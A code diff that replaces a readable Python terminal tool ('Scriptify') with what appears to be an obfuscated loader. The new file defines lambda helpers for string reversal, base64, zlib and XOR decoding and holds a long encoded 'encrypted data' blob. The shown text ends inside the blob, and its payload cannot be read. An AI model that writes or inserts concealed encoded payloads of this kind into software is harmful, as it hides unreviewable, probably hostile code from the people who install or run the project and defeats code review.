@@ -1,310 +1,45 @@
-import os
-import sys
-import time
-import random
-import subprocess
-import platform
-import pyfiglet
-from termcolor import colored
-import shutil
+import base64, zlib, sys
 
-# ========== GLOBAL BANNER FUNCTION ==========
-def show_scriptify_banner():
-    """Display Scriptify banner - same everywhere"""
-    os.system('clear' if os.name == 'posix' else 'cls')
+# Lambda decryption functions
+rev = lambda x: x[::-1]
+b64d = lambda x: base64.b64decode(x).decode()
+b64dd = lambda x: base64.b64decode(x)
+decompress = lambda x: zlib.decompress(base64.b64decode(x)).decode()
+xor_dec = lambda x, k: ''.join([chr(b ^ k) for b in base64.b64decode(x)])
+
+# Encrypted data and key
+data = 'VzRuUjQxaEhiMDNVNmhoWlJWR0d4OW5FNDFuWWJOSGVZbDNmT0pXZS9SMlpIdFJTblZXVTRCMlFBSjNYcDluZXRGSFE0NTJXekZYUXhkVWNHVjJmOE4xRVpnM1pQWkVmYUVHZi9KVmFhOFhlNU5IZmZVbWJtTmxZL1IyUUg5WGNhMDJjSUprRTRaR2Y1RlZaeGwzYzZ4RlhzRm5RcGhSZmY4bFFsbFZlRnAzZVNnSFpTRjJjUGRtRVMxblJ4NTNmZmdVVXhObGNzOWtXUDluWjkxSGIveGxhamgwR1l4R2VpOVVSSXhYYis5SEc2TkdlUkozYi9OMlU4aGtIUE5uU2UxblJsdGhHODlFR1RJbFM2RlhROGxsY1kwSGZobHhUQk5FUVB0VmJCOVhRUFZrWlpaR0dnUlVlQXAwR2g5SGVZNEdiSmxsYWFjMlJoeG1aN2xHR1BCMFJ6NUhiZkpsU2ZJMmZ4aGhjdWwwVStoUmZ5SkJRL3RWY1JCbWI1OW5UakZuZmwxaEhaRW5ZbFYwZlNGWGZ5dEJRL1ptR0QxbmNkeGxSSmRXZjhwbmN4MW1TRWwzYkpGbEVHOUVZVHR4WmtGSGZPTlZlc3BFZjk5R2Zia1hReU4zVDk5RVJiQkVlYXcwWStObGNGWldXNjkzVGNaR2I4QlVZRnhYWEQxR1NlRVhRSjl4UlpBMllQaEJTWlJFYmw5eFJCMW5ZNTVuY1J0Vkc2dFJZQkozWTl4R2VLVjJZS2x4R0E5VUdpbGhaZlYyYkpwQlNSQm1RZkprVEIxMmI5QjJVR3huWnBGRllSQjBjeHRoWnZGbkdiMUhaemxuZkpOMVF1OW5YbDVXU2JJWFU5ZGtIK3BVR2lGMVRha1dRS3RoSHUxblVwTkhaSGxtRzV4RlE5NUVReEJVY25OMGM0RmxiWllXUXhGbFpZTlVmeU5GUmo1bkgrWlVTZTEyYzl4V2ZqVldXOVZrZWRwMlJsNVJjYjhYYmU0blNlb25SeE4zUVJsVUc2MTNmQUYyZi9sUmFqbEhmdDlHZWR4RVE2UldZR0ozZmJoaFNaOTBiL2hoSHN4SGJ0eFdaWnMxWTRwWGZGaEVaaGx4ZitsV1V4aGxIQUpIUVR0eFpkaEZRSTlSZkI1VVdjeDNmVFJVZkpGbFl0aDNjYlZVZmVBVVVseDFFc2huVVk1V1puTmtibUJXZlk4MEhtQmtmWWNrUkpKRlNIRjNadDlYZVI1SGZPMVZZUnBFWkQ5SFpmY2tmODlYWlk4RVE1ZFVTdjVCZkpoeFhHOTBINU5HWkRKQmEvZFdiRjlVWkhGVVo4NWhmOEoxUis1RVpIbFJaWjlGYU94MUhHWm1XRDVYZWNwV2I5dFZjQnBrWmg5bmNZd2tSK3RoR3NwVVJ0bFJaUkJVUUlsQldzbDNVNTFuZmVBVWIrbEZSSFptR3hwUlpZOFVVZ3BoYTlWV1hmd25aUkZtUjh4bUhBSkhheEYxVGFJV1E0WjBRdGhuR2hOblRlOUZhK0ZVWmJjMlp0bFJTZzlVZm1GVWFCcEVlbDlIWlk4VVU5OXhRdDlVWHhOSGY3MW5HeDlXWkdGWGJ0RjFmL2xIR0oxUmZIaFhlYlZVZlM1aGI4dFhZWkluY3BGVlN2dDFSbUIwVWJvRVJoTjNUYjBIZklGM1FCNVVidFZrWnRKQmU1bFJjelZtZWVBVVpZTTBZUHRWYnpGSFg2VkVla0poZi9KV2J2UkdZUzRHWkVsWFVnTmxlSDEzVTZsUmY3SmhSK3R4VHV4M2Y1TkhmUkpYYjUxeFJ0MW5IbTlIZi9WbUdJbDJXOWxVWHAxWFpmSTNHSXBSZXZoMFVpQlVjUkpCYmtKVmUvMW5RRDVuU1lBa2J4RjBSYkVIR2VBa2V5bDJjSmxCWHM1blloQjBmbUZHZjVKVWV6WjJRaFZVY1lnRmVQbHhRSDVuR2Z3R1NaOFVVZ0ZYZTloRVJiaFJlWTRoUks5QlR2OWtYbFpVU1pwMmJJWjBRdTlrV0hsUmZkRjJZT05YZUY1RVpQRlZjSDlrR2doWFl6MVhYSDltVDhGM1J4TjFXODFIR3U1SFo1bDNSS3hXWXNoblE5cHhUZWdVZlBKbUVaQUdSSEZsZjdGM1I5VlVjRjlVVTZGRWZvVldReTVCU3Q5WEdxZFVjZncwZnhKMFRCaDBXYjVHZWtsM2NQSlZlQWgwVXBGa1NhMVdHSWRVWWJVV1I5MVhTYTQyYzhObFl0bFVHNUZWZmQ4MGM0MXhSdFpHWXhWa1RIRm5SSWhSYVJKWGE5RlZaNWxXUklwUmZ2Vm1VeHRSWmVvWGJJWlVidTUwUjVCa2VhWTJmODlXWTg5RUdjeEdaQ1ZtYjRwUmN0VkdHVGdXY2RObGI0aDJUczluR205V2Z4OWxVUEpXWjl4SGZwMUhaZjRYUngxMlR6RjNldEZWY2hsV2JQdGhlQWhuR0lGa1NhUTBHbTFSYytsblJhd0haWXcwUnhsMlU4Vm1VSXBCZXkxbVI2eDFUSDluWVBCMFRIbG5SNGRVZlJkV1doZDBUWjgwZjhsV2VCeFhjYVlrVG9GV1FQcGhhQkpuVXh4WGV2NXhHbk5tRVMxbkdibFJaU3RoYjh0eFJZY0daU0lVUzl0RmZLdDFUYTQzWmZCVVplOUVRUDloWS9oVWE1OUdmNzkwYjR4M1FIOVVIaDlIWnUxWGIrcFhZWkEyVWN0UlpGbG5STzEzUXpsSEdhWVVjZ1ZXR24xWGJiY1dSUEYwVGF3MGZKaGhlL0ZYWGI1bmZZZ2xVNlIwUUJobkhsRlVmWjkxR2xwMFUrOW5mREJVZnVweEdsZFVmdWwwVWg1WGY1SmhRbUYwVHZoM1FENUdTek5FRzZ4MlI4SlhlRDltZnhWV2I5VjJUdTVrV2FZa2NSMTJHbVJXWjhGblE5RmxjU2xIRzlKbFphazNmNTFIWmQ4MUc2OVZlOHhuUXA5WGZSdGxSS2hXY3NSR2VEeEdabk5VVVA5VllHbFVaSEZVZmI0R1FPQlVmSDFIRzZGVVNaMDJHSnRCUkZGWFc2eFdmR2xIYitoVmI5VldlYUEwVEIxSGZ4cFJZWThrU1NnSGY3TjBZTzVCU3NGSEdiNG5UVDUzUjk5eFVHWm1aYlpVZTRwQmZtMXhSQjUwUWhka2M2NWhSbWwyUkJabVJERkZZQmxuZlBCV2F2OWtmdGxoWjdGM1J5OWhIOEozSEkxV2V5OUVmbU5uRUFWMlFoVlVTU3hrZjl0WGNGcDNIbU5HZXM5RVEvSjJVc1ZtWmJsUlNLOWtmSmwzUUE1MFhQRlVTZjVoZjl4MVhDSm5IZllrZmE4aGZJZFVjejlrZlRCa2VTQkVmS3BWZjk1M1E1eG5aQ2wzR25ORlhBNW5IRU5XZlNKM1kvMVhjOTUzY2ZoSGVLcGhSNjlWY3Y1MGJIZGtTUnBuUjVGRlJiSTNHVDRYU2ZFMmJQeFhldnAwWXBObVpsSmhReXhXYXQ1bkhBZFVlWnAzUklweFF6NVVHRVZrU2V3bFJPaFZaWThrVXFGVmZFbG1HNUJXZXZsWGJsOW5jeU5FYm1sbGF6cEVlaDlHU2VrV1V5SkZRWVkyWXhCMFRCVm1HZ0IwVFljbUhmd21TZUVXR0pKVmVab1VjdDlHZllvM2JtdFhmamgzR214WGNrTmtiSzUxVFlJM1FhQUVmbDEzZjROM1Jaa0hHOWxoY21WR2IrdDNXR2xuWWh4V2VhRTJmOUYyV3VoblUrNVhjc04wUi9aVWI5NWtIeUZVZmRWV2ZsOVdaYVlXUmhWVVNaY2tmbXBoWWo1bkdQaHhUbTV4R25OV2NCSlhINWxSZXk5RWI4Sm1HdWgzVUk5SFNTOXhHbkZWWStGWGJ4OVhaOGxYYjQ1aGM5OVhINWxSWktkVVE5OWhmelJtYkhWa2NjZDBmbFZVY3ZaR1hteFdlS0pSR21wWGJBeG5VVDRXY2RaV1VnRmxhejlFYjVGRlljNW1iK3RWY3ZGblFINUhTU2RrUm1ObGF0eEhiNUJFU1lNeEdtUlVjOXhuWlNnV1Nha25iOGxoWkI1a1JseFdjQnBCYjVORlgrOVhaZWtSZVJOa1JJNVhhL1oySGJoQlNkaGxSOTVoYS8xWFJieG1aYkZIRzlOM1diQVdVcDFIWllOMUc0RjFRWUluU3hCa1Q4RkhHSlZXYVJCV1poQjBUZFVHYjloVmZZQVdXNUZWWllWMlk4aEJTamhVUWJaa1NSRldHUE5GVHo5a1p0dFJlRFZtYjQxMlIvOWtHVDRYWlN0VmYvbFJhdmxuWlNzaFpubFhHeU5sRUc1SEc2NW1mc0poUUtWMFR0VkdHSEYxVG4xMmNsaGxIYmdVR3loUlorSnhHblIyUUZGM0dFTkhlaUZHRzR4MlJSaFhReHhXY1o5MGZPSjFSc0ZuU2ZobVpTdDFjNTF4UWE4M2JTc2hjZXNsUnhka0UrcG5lcDFHWllsM1k4dFJmdWwwYnBGbFplNG5HbU5WYTl4bmNseFhaZlYyUklsUmM4bFVlbGxSZm1sM2ZKUlVaOHhuZTVGa1p4VkdmKzkyUlJWMmN4cFJabnBoYjV0aGN1aG5XNTVHZmF3VWZ4eFdZOXBVYmU0bmNZMEhiOU5GUUJKbkhBRmxadkZuUm05WGE5cG5ZRFowZmVsSEc2dG5IYkluZnA5V1o2OTBZT04zUlo4M0dsVmtUdDFIYmt4WFpab2tjRE5uZWFjVVFLcFZmc1ZHR1NnV2N1OVViT0ozVzg1WFgrdGhaNEYyYmxsbUU0WldVWUowZnVkVVFLRjFSQTVrYkgxWFNISkJiUFpXZjhWbWNoaFJaOE4wYi9oV2F0cGtHeFZrY2ZvSGJ4OXhUKzlFUVBka1orOTBja3R4RWJFWGF4TkdmazlVUlB4bGM5WkdlRHBoU2tGblIrdGhiRmhuUjVGRWZSRjNZUEZVZVI5WFlseFdaZU1VVWd4bGYrbFVVcE4yZmtWMmJLbFdjLzlVRytkRWZkVVdReDkzWENWR2F4RjFaWk5CUU85QlMrNVhaRE5uU1JwSGJJcGxIdVZHR01kVWNhd1VRSmxGU2FjV0diNFdjZUZtUjU1WGNIaFhRUHhHZi8xMlJ4QldjWWdIV3hoaFp1TlVSSmxSZUZKSFE5RlZjYTBtUmxOV2NhZ0VmZmhYU1NKbkdtaG1FQWwwWmwxV1NmWW1STzEzV0doVWJiQlVjNTFuR2c5bUdHNTBIdDlIWkRWMlk5cGhaejUwR3RGbFN1MVhHUGQwVStKWFdNOW5meUZYUTZKMlhTSlhlUGRFZkhsWFE0MVJiamhVSEhOWGNTNWhSK2hYYWpwVWU5aHhaUnRWYm1aV1lGeEhaeFpVZmdGbVJLUjBSOWxuZlB4MlRZRVhHZ3RYYzh4SFFoOTNmYVFFUUtSMlhab1VIdDFYY3RGbmJ4dFJZODkwSFB0aGNvZEVmNUoyUUFwRWJoTkdTbEp4R0pKMVVaa0hmbE5HWnBKQmU5cEJXNDlVYlBGRll2Rm5SbVJVZnNaR2V0MW1UeE5rYklsaGJqcEVaRDltU1NwV1JtaFJjK3hYYWU0SFN1MUdmOGhXWmpSbWJoWmtUU0pXZktGRldaSUhmeE5YZVROa1I2cFZZc1ptVXRGMVRzcHhHeWxXYlo4WFdEOW5aRmxIZktObUh1NVVZOUZsWkNsR0dKOVdjR3BYWGZBa1NTTnhHeDUxVFJKWFhEOW1UYlVtYjVwVWM5aGtldHgyZlpSVWZreDNXOTkzUlNJbFpzTjBiSXQxUVlvMGVIMW1UQkYzY0s1eFc5aEVHQTFIWmUwMllQSmtFdWgwVVNrUmNURm5HbjUxUTlsVUhTa3hUdTFtYm1GbEcrNVhVbHB4ZmJKaGY1OVJlUjUzWmJOWFpkcDNmbTFSZUE1VVlEZFVaYUVIZmxORlQ4UjJHY3huVDQ1UkdQbFdlSGhYWEl4blNHTkZRSXBsRXVWbUh1OVhaZjBIR1BKV2VhZ0VaaEZFZlI5bGZsNUJRWThYV0U1R2VUNUJiNUYxVWJBR0c5bGhjSEZYZnlseFdHRkhHOU5IU25sMlk1NWhjWmdFYnhseFppZDBSUFoyVUFWR0djNW1mYndVVStGWFpCNVhSaEZFU3U1QmZsaDNUL0puUmZoWGZIOTBSUGhWZUgxM1p0aFJjaXBCYisxV2NHVkdaUDFXZlo0M2YvNUJRc2xuWWZobmUrdFZmeUpVWThSV0h0TkdlWlYyR21wVWI4NW5HNlZrU1JKaGJsZFVaOEpIR3FweFpmY1VHbTFWYmI4a0grMW1mSGwzRytGbFlBRm5mOTFuWkVOa2J4SldjWjhVZmV3R2VrcGhiK0YxR0FKSFdmaEhldjFXVXl0UmVqUkdZbDVXZWFFSFF5aFdjdUZYZnRGVVNZRkhibUYxUXZoRVFsbHhUZDhVZmw5V2VBOVVHVGdIU2xOVWJrTjNXRzVYVWlOV1puTlVmbHgxVStWMmZUQmtUWThVUXhCbUU0UkdhVEJrU2ZzMWM4aG5Fb1YyZUQ1V2Y4dFZHblpXWUcxWEh0MW5jZW9uR3hGWFpCaFVHNjFXZWNGWFJQcDNUL0pYVUkxV2ZlTUVRNVZVZWFZV1hZQlVjZUkzR2x0MVFBOUhaaFpFZWNoRlErRlZjWlVXVTZweFRpVldHSTVoSEc5a2ZmSkVlZUYyY3kxbFpiOGtIRVpFZWlsV1J5OUJRLzVVWXhweFp4RkhReHRoZUI1bll0eEhmYXdVYjhGVmJ1NTNRNXhHWi90MUdtcDBXejVFV2xGRVMrbDNjeEZWWWpGWFhpeG1TKzFHYjk5eFF1UldVY3hHZWRaMmZsTlhjWUVuWmVBa2NTTkVRL2RVWXZ4M2U1QlVjaUYyYkpKbFpHSlhSdDVXZXBGM1k0VlVaWjBIWnQ1SFpZSTNmUGgyUkJ4M0g5eEhTWkJVUUoxVlpGcDBReDVHU1lJbWJtMVJjdGhYWnBGVlo2MVhHK0JVY3M1RUdpTkdlYU1VYjhwVVlGWkdHYzVIZmZOVVJJdFZiQlZHUlNnSFpHRkhHNDlCUjhsMEdTZ25lKzlGYStkV2NqUm1HeXhXWmVGMlJJRlVhSDUwZXQxV1NZUVVSSUpYZVpBV1JTa2hTWkpIZjZoVlpHNTBXUDFYUzY1aFI1UjJSOWhYSHQ5bWZCdEZReGxGWEE1MFVUa3hmbGxHR2xsQlRHNW5RYlprZWhOVVVuMVZjdDVFUWZobVphZ0ZiazVoWmE4WGFQMUdaQkZHRytOMVRBRjNmNTlYU0s5bFVndGhmOFptZmw1WGNDVm1ST3BSWnQ1RWJ0MUdlZUltYjhoaFl1NW5HNVZVUzgxWFVQbFZZQTlYR2h4V2MvTmtSNnBoYWEwSFJ4VkVmZFZXVUt0UllGaFVYRTVHU0FObGZKcFhjL2hVUkh4MlRlNFdiSUowWDRSR1pQMW5aOTEyYkpoaGMvNWtHOVZrVFk0WEdsbHhUOVJHRzVsQlloRkdRNUoxSCs1RUdjNVdmZHAzYjRCVWVzaG5VcGQwVFo1aGI4bGxjRzVVWG14WGNjTkJiUFJXZXRsVUdpeDNUQTFtUkpaMFQraEVHaXhtZmZZV1F4OVhlSDlrYjVsQlNTWldSSzVsRW9sSFh5eFhjVFoyWW10UmF0NVhVbFprVFJ0bFJPOVZjalptSEQxR1NHNUJieFIyVFJGSFE5aGhjWWdFUTVwbEg4NTBVWUpsWmsxWFIvNTNRdXAwV2hGVlNhZDBiSUIyUkI1WFVJTlhaamRrUkt0aGF0OWtXeDFXU201QmZQQjBRczFYYlN3WFo5ZGtHUHBrRStaR2FoTldTeTlVRy85eFJ6aDNVRTFXZlIxM2NQeDFRdFZXZlA1bVQ2TlVmSkZVWUE5RVpUWlVaVFIwY0sxbGZINWtHRDFuY3lGbmZ4NVZmdGhVUVA5bmNaMEdReE4xV0dsSFpTZ0hlYlFFR2xsMlJBNWtmbEZWU25OMFk0UldaSFptZWZ0QlliVVdiNFJVZXYxSGFsMW5aZWxYUU94WGVqaDBmSGRVY2Z3MFk5MTFROFIySG1WMFRhTWxibDVSY3RsWFlEMVhTZGxYR25KVllBbFhSYngyVG45RlFsNVZmczlVVTZObmY3VkdHK2RVYlpjR1o5eG5mUkpYUitKV2N0bEhSRGx4Wkdka1J4dFJaLzEzWkR4WFNGbG5SeU5VWlI1bkh1OUdTK0ZtUitWVWVqOUhmbDlYY3hkMFJPMVJhQjlVZWw5V2VuRjJmOGxoY0g1VUhQeFhjZU5rUjhGWGV2NTNjNTVYZVpZMmNPMTFYb2wzWXhObmVZVVdHZ1pVYkZsWFVTZ0hTdE5GYngxMlFzbDBRVHRoZm1sMlJKMUZRSGhYZmxCa1R2Rm1SK0JtR1owSFlsOUhab1ZXVUtsMlJCOWtIdTFYU0hsR0dtcFZZRmxYRzl4SGZZZzBSbDEyV1pjV1g5OUdmeE5VVWc1aGZGRlhmU2t4Wjd0VmY4MXhSWlVXRzYxbmVSNTJmK1ptRUFGWFF0NW1aWm9oZksxUmI4RlhRYnhtZllzbFJLMVJmSEozUWwxR1pSRm5HSUpGUkFGWEhhNFhTSDEyZnl4bUU0Vm1RREJVY1Q5MFlKbFJadlJXUjV0aGViVldRbDlSYmE4MEhtbFJaYk5FR2xGV2JqNTNIcDlHZWJjMFJLTlZjdHhIWGJaVWVnSmhRSWgxUkcxM0hmaG1aYW9uYlAxbkdzMVhVRDFHZmVsWEcrbGxiczUzSGY0SGVlRW5HbE5XWmpobllmNW1TR0ZHUUo5WFlSRm5XYmxSYzg5a0duaFZiQlZtY0haRWZBOUVHZ0ZGVC9oMFpoeEhTYnBoYjlwa0grOUVXdE5tVFlsV2JJbHhRWkkzSGZ4WGN4RkdHbEJXYVlJM1dETlhmWTgwY3l0aFkrUjJXUFpVU1lrbmJPcFhjYUkzSGlsQllaWVdSS2xsWnVsM0dERmtaNTFXUW01MlRCMUhYZXduZmFBRVE1aFJlSDUwSEVObWZBRm1SNnBWZXRsWFJiaHhaeWQwR2w5MlRIbEhibDlHZVJ4bFJ5MTJUc1ZXVTZwaFNETmtibU4xUi8xblFIZFVTZHBuZktsaEdBSkhYbXBSZlpZR1E4OVdZLzlVZTl4MlRsZDBmbUZVZStsRWJQMVdjQTlrRzQ5aGJGMW5ZOXhIZURGV0dsZFVaK2wzWnRoaGZ6TjBHeXhWWlpZMkhsaEJlQVZXUUpKa0ViODBIdTlXZTlkRVFPMVhiWmswRysxV2NBVkdHNVoyUlJabWNsZEVTNjFXRy8xRlh1RlhIYXdYU1JsWGY4QldZdUZIZWw5WGVkTmhSS1YyVHVGbll4RkVlWkFFZng5WGZaOG5mYXNCZWxwQlE2ZDBRK0ZuR2hGa1phZ2tHK0ZsWUg1RUdxaGhTbmRVUU9ObkVDcEVZcGQwVFo5Ukc1eFdhdGxFUTk5MmZaWUdHbjVtR3NGM0dNaFJjR2wzUjl4M1hHOTBVdDkyVFpKbmZKVlVjdHhYWHlkRVNtVjJiS2xSZlk4WEdJbFJmZFpHUXlwa0dzaGtSdDltVFR4RVFJOVZlWWtVZkROSFpaWjJZKzVWZmFFblV1dHhmbVZHR3lsaGJqRm5TOTFIU25OVWZ4RlViOFoyUjloeFpSNUhHNXQxWEM1blhENVdmLzlsVUtGVmNGaFVXVDRYU0gxV2I4eDFVWkFXVTk5V2ViRTNSLzVsRXVWR0dBOUhlc2RFUS85WFk4eEhZaFpVU2FJQlFsSkZSOEpYSHA5R1M2OWxVblJVWVpjR1l0OW1aU1ZXUUpSV1k4UkdHRDFuWktGR0crWjBUdTkzUkhGVVNkaGtSUEZsZXY1M0dEeG5TaDlGUXloaGViOGtVaTFIWllKaGZ4cDNSRzlVVytCa1RmOGxiUE4wWHVsWFhobGhmbjEzWTQxRlNGbGtaYlZrWlpsM2NKWldmc2wwUlBObmNZSW5iNEJVYlJWR0dJaGhaaVZtR2dkVWJHVjJHaVpFZlJabUc1RlViSGhrUnBWVVpZRlhRbFowUlJKblM1RmxmQ05FR2dCVWNqeDNRUDFHZVpJM1IvZG1HYkEySEloaFplTmxSL2QwVGJnRVJoaEJZajFXYitoMVJSQldjbGxoY2xGM1I4UldaLzVFZkQ5blpzRlhiL3RCWGIwbldiaHhUU3BYUlBCV2YvVldVTU5tWmRKM2ZPSmtFQ2xrZmxObmNzRkhiOEZGVzRsWFdJRlVmWlJVUnhSMFIvNUVYSDFuZmJvM2ZKRldaQjkzR0g5R1pZTWhSS05GVGJjR1Jlc1JaNDFuYi94MlVib1VHbXB4ZlNKR2IrMW5IQTlrZkhCMGZiRjNZbHBCUWpabUhNdFJlNUpCUU9GMlI5bGtScDkyZjlORlFKUldaWlVtWGwxR1piRlhHOXBVWUI5bkd1MVhla0YyZjhWV2Y4NW5YSE5YWlRwV2Y1ZG1IQUpuV2hWVVNlbEdHZ0IyV1o4SEcrOVhaY1ZXVTZsUmN1OW5TeHhHZWZGMmNJMWxmL3BYSGxObVM4RkhHNnhWY2JFWFU2RmtmK0poUTUxUlpab1VZcGRVWllnMGNsNVdmYmNXWGh4bVpEVjJZK3BoYlJCV1d5cEJZVHhVRzlKM1VBbEVhNXhXZWoxM2ZKcGhiUlZtZWU0V1NkOGtmbE5YZVpJM1JmSmtlekZXUjV0eFJIbFhVSDlHWmRNbFJ5TjFVOFptVWJaVWVITkVmeUYwVFJsMFpiZEVTN2xXZitCMlVaOFVlUDlXY2J3MFJJOTNSdmhrWnBGRWZHRm1SOUZsYmFBbVlETjNURE5VR2xGbFlaazNlRHhXWmFKQmUrdGhjdGhrY1M0bmZzVldVOWxYYmFJblh4aGhTdkZtR2x0MVVib1hXaTVXU2ZFbmI1bDJUUmhVVWk1WGVlWTJmazUxVzl4WFVNeG1mbU4wWU94MVIvNW5SOXhIWmQwV1V4bDFIWmtFR2lka1pZdEZRL05sZThwSFdsTm1TZEpHR2w5WGZBRlhSYVlFZmZNRlE1bHhYOGxYWGJBa2V1OTBZSlZtRXVWV2FiTjNmZEYyYjR0UmN0eDNlREZVY2EwMmJrSjBSR3BYZXhOWGY0MVdHeWx4Ukc5VVpoeFhTb2xYR241VllCeG5XOTVXZmVJbWI0WldaWjRuUnR0eFpLNUJma0YzUkdwMEg1TlhlZDlVUjVoUll2Wm1YOVZrVEgxbmZraDFXOHhuUXA5R2VHOVVSNE5YZXU5a1JmaG5aWWdVUU9kVWI4OWtlYnR4VFlvbUcrRlZZODlFR1BwQlkvRkhmeGwyUUZGWFhEMUhaU2RVYitaMlRINVhYREJVUy85MGZLbFJmOUZYR2JBa1RmRUhmUHRoWi9sblJEOVhjYTQzYlA1QlRIRm5RYXdXWmVOMFJQdFJldWwzZVN3SFphTjBja2QyUXp4M0c2MVhTbjlGZmx4bGE5aFhHcUZFZW05RmY1dDNSOUZIVzlka2NmTUJhK2RVYkY1blhsaGhlWWcwYjhCVWU5cEVYK0IwVFNsR0dnWmtHOHBrVWJWVVpjcFhSSlJXWnZoSEdBcFJmYUlHYjhsbkV1RjNSOUZVY0dOa0c1bFJZRkYzWHBweGZEOUZlOXhXY3Y1VVhEdEJTQWwzUktoQlFIcFVXaTVXZmRFbkc5cHhFU0JHWWFzUlpZd2xmeVYwV0ExblUrdEJlWjVtYlB0QlJzeG5RZmhYWmJ3a2ZsNTNRajVuZlA5bmV6SkJRbWxsZmFBR1JmSmxlZjBHZko1aFlINWtVNmQwZmZFblJ4dFhhamwzSDVwaFpiUTBSK3RsSFpnMGNhd0habUYzZk9OWGNBaFVhNWhCWVJobGZ5OVhmUmhuVU01blRjSm1SbTFsYnU1M1FsTjJmZmxXUkk1V2Z6aG5SeHB4ZmI0bUcvOUJXWjBuV3hseGZlMDJHSTVCUjhGSFpQQmtTUjFuZnhGV2VBOVhidFpVZmRFblJPVjBVczVIRytWa2VIMW1mT2hoWitSbVF0ZFVaYlUyRzZwaFl0cGtjNVZFZTc5MGNrdDNUekZYV0lObWZGOTBZbWxsZVowWEg1OUhlUzVuZklGMFdIaDNjNTVHZmU5bGZLbHhUSGgwWWxoUmVBVldVSlpXZUdoMEc5RkVTRGxtR2d0bEc4aFhHbHhIZmM5MEduVjBXRnBYUnBkVWY4OTBSeDlCUlo4blhoTldlRGxIUXloV2JHNUVScDFIZWRGSGJKaHhFQVZXVzY5SGV5TkVmT3hYWXVWbWZsOW5TYllHYjhOVmUvUkdheGx4Wlk4MUc0TjBRQmxrY2FreFRkMTNjOHBoZkFsblNwRmtjYTlsUU9GVWJzWkdYY3hXU3BkVVVsVjJRK1JtVURGbGZrNXhHbDUxUUc1SFI5cGhjOGxIRzYxbGFqRlhIYUFrVGE4bGZQTmtFRzlIV2hGRllSaFVRSkJrRytWR1F0OW5mbnBoUjVwVlo4Vm1RZUFVU2U1eEdtMVdhL2xrR2x4MlRrMUhmbTFWWnNSR1g2ZGtlY3RWR2xwVmUrNW5RaE5IZWZjMGNQSlZaelYyUmxaRWVaWldReWRXWUI1VUdmWjBmUkYzR21ObUhib0hHYzVtVFlnMEdtdHhVK1ZXSHQ5V2ZlNWhSeHhuRVpBbWZTQWtTYzVtR2xweEVBOWtYOXBCZVNOaGY5TkZTRmhuR2JOSFNTbEhmbEZWWmpoa2NieG1mQTlFR0loaGNzVm1YSEZWU0RsMlI2aFZZRnhYUlRCRVNaaDBibUZuRTgxM1JETkdTZEZXZm1GbGV6Rm5ReDVtZlpvUkcvOVZaUmxrWURCa1R5OUZmbHRWYnM5a0dUbFJTQ05GZlBwM1JHeG5IeDlIZWNSMGMvbGxmQmhrWHg1R1phNFJHbHhsWUZwM2VwRmxaYXNWZk9wWGZqeEhYU0lsZm45bFFPNWhZUjlVWGJOSFplQVViKzVYZmFna0dic3haWmgxR0lkV2ZzOVhRZmhYWmM5RmU2eGxmUmRHWFNZa2NTSkhma0pVZXp4bmNIRkZTZjlFUUtaMlhDcGtVaDVIZjVOMFI4SmxZYWdIWVBOV2VaNHhHNE5VZVljMmM1NW5mYmxXUTlGbForNWtIUHRoU2VvM1lPcGhFR1oyVXk1SFppbG5iNHRSYUg5a0dxMUhmQU4wWStoVmZHNW5HRTVuWmJvV1E5cFJlakZuR2xWVVNia1dmeWhYYlJsMEhTNEdTdDVoYklCMFhDOW5VTUJVY3VGWGJKRlZlRmhuZXA5M1RiTUJhbXRYWS9wRVhiQWtaYW9IUUt0eFdINTBYdEYwZkhWR2JJbFdmRnBFR0lWMFRTdHhHbXhWYUhKWFloaFJlYmcwYjVGVmN6Rm5IUzRuU0g5VVVtdFJhL3hIUlNJVmZUcEhmUE4wVUdwa0h1WlVTZDlGYmxoQlRhVUdaUHhtZnMxSFFsNWhIWjRuVXlaRWZkdHhHbXgyVXU5a1hlQUVmYUlXVWxsRlg4aGtXcGRrY1RoVVE5dFZjWkEyVVRJRmVjTlVmbXBoWXRGblV0OUhabU5FRzlseFF2NVhHK05HU1M1bmY1RmxZUkYzSHAxblN4cEJma05rR1o4VUc1TjJUZjhWR21GMFQvUjJjUE5uY0dkVUdJMWhHK2xrUmFrUmZBRjNmSkpXYXRWbUhNTldmVEZIYng1QlFzeFhXTVowVGUxV1VnUlVZUlYyRytka1NiSVdmL1oyVC81SEc5WlVTaFZHYk8xRlR0WjJaSDVtWkM1QmJrTjFUK1ZHUUROWGNhNG5SSnB4UXRsbmVmSlZTOGwyUk94RlFHMTNVK0ZWWmRVR2I5ZFVhWVkyV3BoUlNSNXhHZ0ZtR1pBMmJQNVdaYndGUW0xV2Fha25VRWxCZWZnRlFPOWhadVZtVU0xbVNISkJhSXBoWStoM2NTZ0hlVE5oVWxGV2NzUjJROUZVY0ZORVFKbDFXQXhYV3E5M2ZlQVVVK0oxR0FGM1dITkdlY2wzY3hKWGJaRW5HcE5XWmQ1bWJQSjFSOUYzSGlaa1pUMTJSUEpGUnVsVWZlQVVTRE4wWXhWMFg4UkdReE5HZmw1aGY2cFVaR2xrWGVrUmVmTTFHbnQxVytWV1FEVlVjdTFHR24xMlJzeEhibDltZkhObGZKaEJSczEzWXhsaGNhNFdSK0pGU1JoSFhoRjFaRGRFZnlaV2M4UldRbEZWZm5GMmZ4NVZlOUZIR0lGRWZaZFVieEoyV0hKWFFEVmtlUzkwYjVoWGF0WldZNUZGWWFFM2Z5aDNYU1ptR3V4V2NZTWhVS3BYYkFWR1FIdGhjWUYzYi9kV2Fhb1hYY2xSZWZZMmM0QldldXBrZUQxWGU4bG1HeUJVYXZsWFdQOVdTeEpoUUpKbGZqcFVXZjVXZUhOMGNKbHhSOWxVUmJaa2MvdEZmS0JVYXo1RVE5dFJaS1YyZitkMFJ6NVVYK3BSZW0xMkc5bFhZdjVuWGFreGZhZDBmS0ZYYkJ4bmJwRkZlbGRFYjhwMVFzNTBZSDFYZmk1eEd4cFVmODlFUkhCMFQ0OTBmNXRWWnV4bkcraFJadTVCZlBaMFJqNVhjRFpVY1NGMlI4SlZmYlltZmhGVVNvMUhmbWxuSCtSV1pmaG1UYndGYkl0UmJqNTBYVEIwVDkxWFIvWmtIQXhYUTlOV1prRm5SODlSWUYxbkdha1JaOWRFUUtCMFUrSjNIYjFHZllkMFlQMVdmQmhVYWg5bmNIZDBmeUpXYzlaMmNwRjFaYWcwUlBOMlJZQW1XOTVuY1R0RkcvNVdiOHBVR2JaRVNUSlhiOGxWZUFWMmVla2hjZjlsYjR4RlN2aGtmU0FFZVROaFE2OTJUQUYzZjk1R1o5MTNja0psWVo0WFE1eEhTYVZXUnhaMlRiWUdmeGhCWXUxWFVueFdaUjFuUURoaFNmTTF